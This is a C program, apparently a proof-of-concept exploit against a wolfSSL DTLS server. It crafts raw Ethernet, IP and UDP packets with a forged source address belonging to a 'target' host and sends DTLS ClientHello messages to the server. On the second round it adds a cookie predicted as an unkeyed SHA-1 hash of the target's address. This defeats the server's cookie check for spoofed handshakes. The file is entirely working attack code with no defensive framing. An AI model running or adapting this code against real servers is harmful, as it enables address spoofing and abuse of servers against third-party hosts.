#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <bsd/string.h>
#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <getopt.h>

#include <wolfssl/options.h>
#include <wolfssl/wolfcrypt/sha.h>
#include <wolfssl/wolfcrypt/hash.h>

#define DEFAULT_IF  "eth0"
#define BUF_SIZ   1024

#define TARGET_PORT 11112
#define TARGET_ADDR "127.0.0.1"

#define SERVER_PORT 11111
#define SERVER_ADDR "127.0.0.1"

static const unsigned char cipher_suites[] = {
  0xc0, 0x2b, 0xc0, 0x2c, 0xc0, 0x86, 0xc0, 0x87, 0xc0, 0x09, 0xc0, 0x23,
  0xc0, 0x0a, 0xc0, 0x24, 0xc0, 0x72, 0xc0, 0x73, 0xc0, 0x08, 0xc0, 0x07,
  0xc0, 0x2f, 0xc0, 0x30, 0xc0, 0x8a, 0xc0, 0x8b, 0xc0, 0x13, 0xc0, 0x27,
  0xc0, 0x14, 0xc0, 0x28, 0xc0, 0x76, 0xc0, 0x77, 0xc0, 0x12, 0xc0, 0x11,
  0x00, 0x9c, 0x00, 0x9d, 0xc0, 0x7a, 0xc0, 0x7b, 0x00, 0x2f, 0x00, 0x3c,
  0x00, 0x35, 0x00, 0x3d, 0x00, 0x41, 0x00, 0xba, 0x00, 0x84, 0x00, 0xc0,
  0x00, 0x0a, 0x00, 0x05, 0x00, 0x04, 0x00, 0x9e, 0x00, 0x9f, 0xc0, 0x7c,
  0xc0, 0x7d, 0x00, 0x33, 0x00, 0x67, 0x00, 0x39, 0x00, 0x6b, 0x00, 0x45,
  0x00, 0xbe, 0x00, 0x88, 0x00, 0xc4, 0x00, 0x16, 0x00, 0xa2, 0x00, 0xa3,
  0xc0, 0x80, 0xc0, 0x81, 0x00, 0x32, 0x00, 0x40, 0x00, 0x38, 0x00, 0x6a,
  0x00, 0x44, 0x00, 0xbd, 0x00, 0x87, 0x00, 0xc3, 0x00, 0x13, 0x00, 0x66
};

static const unsigned char signature_algorithms[] = {
  0x06, 0x03, 0x05, 0x03, 0x04, 0x03, 0x02, 0x03, 0x06, 0x01, 0x05, 0x01,
  0x04, 0x01, 0x02, 0x01
};

static unsigned short identification = 0;

uint16_t checksum(const void* ptr, size_t len)
{
  uint32_t sum = 0;
  const uint16_t* data = ptr;

  while (len > 1) {
    sum += *data++;
    len -= 2;
  }
  if (len) {
    const uint16_t odd_bit = *(const uint8_t*) data;
    sum += odd_bit;
  }

  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }

  return (~sum);
}

size_t generate_cookie(char* buf, size_t sz, const char* target_addr,
    uint16_t target_port)
{
  struct sockaddr_in peer;
  memset(&peer, 0, sizeof(peer));
  peer.sin_family = AF_INET;
  peer.sin_port = htons(target_port);
  peer.sin_addr.s_addr = inet_addr(target_addr);

  byte digest[SHA_DIGEST_SIZE] = { 0 };
  wc_ShaHash((byte*)&peer, sizeof(peer), digest);
  if (sz > SHA_DIGEST_SIZE) {
    sz = SHA_DIGEST_SIZE;
  }
  memcpy(buf, digest, sz);
  return sz;
}

void parse_hwaddr(unsigned char* target, const char* hwaddr)
{
  sscanf(hwaddr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target[0], &target[1],
      &target[2], &target[3], &target[4], &target[5]);
}

int run_round(unsigned int round, const char* interface_name,
    const char* target_addr, uint16_t target_port, const char* server_addr,
    uint16_t server_port, const unsigned char* server_hwaddr)
{
  struct sockaddr_storage storage;
  memset(&storage, 0, sizeof(storage));

  struct sockaddr_ll* socket_address = (struct sockaddr_ll*)&storage;
  socket_address->sll_family = AF_PACKET;
  socket_address->sll_halen = ETHER_ADDR_LEN;

  // raw socket
  const int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sockfd == -1) {
    perror("socket");
    return 1;
  }

  // index of the interface to send on
  {
    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strlcpy(if_idx.ifr_name, interface_name, sizeof(if_idx.ifr_name));
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
      perror("ioctl(SIOCGIFINDEX): %s");
      close(sockfd);
      return 1;
    }
    socket_address->sll_ifindex = if_idx.ifr_ifindex;
  }

  // MAC address of the interface
  struct ifreq if_mac;
  memset(&if_mac, 0, sizeof(struct ifreq));
  strlcpy(if_mac.ifr_name, interface_name, sizeof(if_mac.ifr_name));
  if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
    perror("ioctl(SIOCGIFHWADDR)");
    close(sockfd);
    return 1;
  }

  char sendbuf[BUF_SIZ] = { 0 };
  memset(sendbuf, 0, BUF_SIZ);
  size_t pos = 0;

  // Ethernet header
  struct ether_header* eh = (struct ether_header*)sendbuf;
  memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, 6);

  if (server_hwaddr) {
    memcpy(eh->ether_dhost, server_hwaddr, 6);
  } else {
    // try to get MAC address of the server
    struct arpreq arpreq;
    memset(&arpreq, 0, sizeof(arpreq));
    strlcpy(arpreq.arp_dev, interface_name, sizeof(arpreq.arp_dev));

    struct sockaddr_in* in = (struct sockaddr_in*) &arpreq.arp_pa;
    in->sin_family = AF_INET;
    in->sin_addr.s_addr = inet_addr(server_addr);

    const int ret = ioctl(sockfd, SIOCGARP, &arpreq);
    if (ret < 0 && errno != ENXIO) {
      perror("ioctl(SIOCGARP)");
      close(sockfd);
      return 1;
    } else if (ret >= 0) {
      memcpy(eh->ether_dhost, arpreq.arp_ha.sa_data, ETHER_ADDR_LEN);
      memcpy(socket_address->sll_addr, arpreq.arp_ha.sa_data, ETHER_ADDR_LEN);
    } else {
      // try a broadcast address
      memset(eh->ether_dhost, 0xff, ETHER_ADDR_LEN);
      memset(socket_address->sll_addr, 0xff, ETHER_ADDR_LEN);
    }
  }
  eh->ether_type = htons(ETH_P_IP);
  pos += sizeof(struct ether_header);

  // IP header
  struct iphdr* iph = (struct iphdr*)(sendbuf + pos);
  iph->version = IPVERSION;
  iph->ihl = 5;
  iph->id = htons(identification++);
  iph->tos = 0;
  iph->frag_off = ntohs(IP_DF);
  iph->ttl = IPDEFTTL;
  iph->protocol = SOL_UDP;
  iph->saddr = inet_addr(target_addr);
  iph->daddr = inet_addr(server_addr);
  iph->check = 0;
  pos += iph->ihl * 4;

  // UDP header
  struct udphdr* udph = (struct udphdr*)(sendbuf + pos);
  udph->source = htons(target_port);
  udph->dest = htons(server_port);
  udph->check = 0;
  pos += sizeof(struct udphdr);

  const size_t data_start = pos;
  // content type: handshake
  sendbuf[pos++] = 0x16;
  // version: DTLS 1.2
  sendbuf[pos++] = 0xfe;
  sendbuf[pos++] = 0xfd;
  // epoch: 0
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = 0x00;
  // sequence number: 6 bytes
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = (round & 0xff000000) >> 24;
  sendbuf[pos++] = (round & 0x00ff0000) >> 16;
  sendbuf[pos++] = (round & 0x0000ff00) >> 8;
  sendbuf[pos++] = (round & 0x000000ff);
  // length: 2 bytes
  const size_t record_layer_length = pos;
  pos += 2;
  const size_t record_layer_start = pos;
  // handhake protocol: client hello
  // type: ClientHello (1)
  sendbuf[pos++] = 0x01;
  // length: 3 bytes
  const size_t handshake_length = pos;
  pos += 3;
  // message sequence: 2 bytes
  sendbuf[pos++] = (round & 0xff00) >> 8;
  sendbuf[pos++] = (round & 0x00ff);
  // frame offset: 0
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = 0x00;
  // frame length: 3 bytes
  const size_t handshake_fragment_length = pos;
  pos += 3;
  const size_t fragment_start = pos;
  // version: DTLS 1.2
  sendbuf[pos++] = 0xfe;
  sendbuf[pos++] = 0xfd;
  // random data: 32 bytes
  for (size_t i = 0; i != 32; ++i)
    sendbuf[pos++] = 0x1f;
  // session ID length: 0
  sendbuf[pos++] = 0x00;
  // cookie length: 1 byte
  const size_t cookie_length_start = pos;
  sendbuf[pos++] = 0x00;
  if (round) {
    // cookie
    sendbuf[cookie_length_start] = generate_cookie(sendbuf + pos, 20, target_addr, target_port);
    pos += sendbuf[cookie_length_start];
  }
  // cipher suite length
  sendbuf[pos++] = (sizeof(cipher_suites) & 0xff00) >> 8;
  sendbuf[pos++] = (sizeof(cipher_suites) & 0x00ff);
  // cipher suites
  memcpy(sendbuf + pos, cipher_suites, sizeof(cipher_suites));
  pos += sizeof(cipher_suites);
  // compression method length: 1
  sendbuf[pos++] = 0x01;
  // compression method: 0
  sendbuf[pos++] = 0x00;
  // extensions length: 2 bytes
  const size_t extension_length = pos;
  pos += 2;
  const size_t extensions_start = pos;
  // extension type: signature algorithms
  sendbuf[pos++] = 0x00;
  sendbuf[pos++] = 0x0d;
  // extension length: 2 bytes
  const size_t signature_algorithms_length = pos;
  pos += 2;
  const size_t signature_algorithms_start = pos;
  // signature algorithms length: 2 byes
  sendbuf[pos++] = (sizeof(signature_algorithms) & 0xff00) >> 8;
  sendbuf[pos++] = (sizeof(signature_algorithms) & 0x00ff);
  //  signature algorithms
  memcpy(sendbuf + pos, signature_algorithms, sizeof(signature_algorithms));
  pos += sizeof(signature_algorithms);

  // Lengths
  const size_t signature_algorithms_size = pos - signature_algorithms_start;
  sendbuf[signature_algorithms_length + 0] = (signature_algorithms_size & 0xff00) >> 8;
  sendbuf[signature_algorithms_length + 1] = (signature_algorithms_size & 0x00ff);

  const size_t extensions_size = pos - extensions_start;
  sendbuf[extension_length + 0] = (extensions_size & 0xff00) >> 8;
  sendbuf[extension_length + 1] = (extensions_size & 0x00ff);

  const size_t record_layer_size = pos - record_layer_start;
  sendbuf[record_layer_length + 0] = (record_layer_size & 0xff00) >> 8;
  sendbuf[record_layer_length + 1] = (record_layer_size & 0x00ff);

  const size_t fragment_size = pos - fragment_start;
  sendbuf[handshake_fragment_length + 0] = (fragment_size & 0xff0000) >> 16;
  sendbuf[handshake_fragment_length + 1] = (fragment_size & 0x00ff00) >> 8;
  sendbuf[handshake_fragment_length + 2] = (fragment_size & 0x0000ff);
  memcpy(sendbuf + handshake_length, sendbuf + handshake_fragment_length, 3);

  // Remaining UDP header fields
  udph->len = htons(pos - data_start + sizeof(struct udphdr));
  // Remaining IP header fields
  iph->tot_len = htons(pos - data_start + 4 * iph->ihl + sizeof(struct udphdr));
  iph->check = checksum(iph, iph->ihl * 4);

  if (sendto(sockfd, sendbuf, pos, 0, (struct sockaddr*)socket_address, sizeof(*socket_address)) < 0)
    printf("Send failed\n");

  close(sockfd);
  return 0;
}

int main(int argc, char** argv)
{
  srand(time(NULL));
  identification = rand() & 0xffff;

  char interface_name[64] = DEFAULT_IF;
  char target_addr[64] = TARGET_ADDR;
  char server_addr[64] = SERVER_ADDR;
  unsigned char server_hwaddr[6] = { 0 };
  uint16_t target_port = TARGET_PORT;
  uint16_t server_port = SERVER_PORT;
  bool have_server_hwaddr = false;

  while (true) {
    const static struct option long_options[] = {
      {"interface", required_argument, 0, 'i'},
      {"target-ip", required_argument, 0, 't'},
      {"target-port", required_argument, 0, 'p'},
      {"server-ip", required_argument, 0, 'S'},
      {"server-port", required_argument, 0, 'P'},
      {"server-hwaddr", required_argument, 0, 'H'},
      {"help", no_argument, 0, 'h'},
      {0, 0, 0, 0}
    };

    int option_index = 0;
    const int flag = getopt_long(argc, argv, "hi:t:p:S:P:H:", long_options, &option_index);
    if (flag == -1)
      break;

    switch (flag) {
      case 'i':
        strlcpy(interface_name, optarg, sizeof(interface_name));
        break;

      case 't':
        strlcpy(target_addr, optarg, sizeof(target_addr));
        break;

      case 'S':
        strlcpy(server_addr, optarg, sizeof(server_addr));
        break;

      case 'p':
        target_port = atoi(optarg);
        break;

      case 'P':
        server_port = atoi(optarg);
        break;

      case 'H':
        parse_hwaddr(server_hwaddr, optarg);
        have_server_hwaddr = true;
        break;

      case 'h':
        printf("%s [--interface iface] [--target-ip ip] [--target-port port] "
            "[--server-ip ip] [--server-port port]\n", argv[0]);
        return 0;
    }
  }

  printf("interface: %s\n", interface_name);
  printf("target: %s:%d\n", target_addr, target_port);
  printf("server: %s:%d\n", server_addr, server_port);

  const unsigned char* server_hwaddrp = have_server_hwaddr ? server_hwaddr : NULL;
  for (unsigned int round = 0; round < 2; ++round) {
    if (run_round(round, interface_name, target_addr, target_port, server_addr,
          server_port, server_hwaddrp) != 0)
      return 1;
  }

  return 0;
}
